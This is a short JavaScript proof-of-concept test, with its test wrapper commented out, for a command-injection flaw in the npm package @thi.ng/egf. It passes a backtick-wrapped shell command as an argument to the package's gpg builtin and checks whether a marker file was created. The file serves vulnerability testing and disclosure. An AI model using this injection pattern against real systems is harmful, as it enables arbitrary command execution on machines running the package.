// test("Command Injection in @thi.ng/egf", () => {
//   expect.assertions(2);
  const egf = require("@thi.ng/egf");
  const fs = require("fs");
  const path = "./egf";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    egf.BUILTINS.gpg("foo", "bar`fsutil file createnew egf 0`", { opts: { decrypt: true } });
  } catch (error) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
